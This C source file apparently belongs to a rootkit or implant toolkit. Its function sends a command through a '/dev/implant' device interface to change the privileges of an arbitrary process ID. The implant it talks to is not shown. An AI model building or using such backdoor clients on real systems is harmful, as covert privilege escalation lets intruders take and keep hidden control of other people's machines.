#include <privilege.h>
#include <debug.h>

#include <stdio.h>

int privilege_set(pid_t pid, int perm)
{
	FILE *implant = fopen("/dev/implant", "w");
	if (implant == NULL) {
		IMLOG_WARN("Failed to access the implant interface");
		return -1;
	}

	int ret = fprintf(implant, "priv --pid %u --perm %d\n", pid, perm);
	if (ret < 0) {
		IMLOG_DEBUG("Failed to write to the implant interface");
		return -1;
	}

	fclose(implant);
	return 0;
}
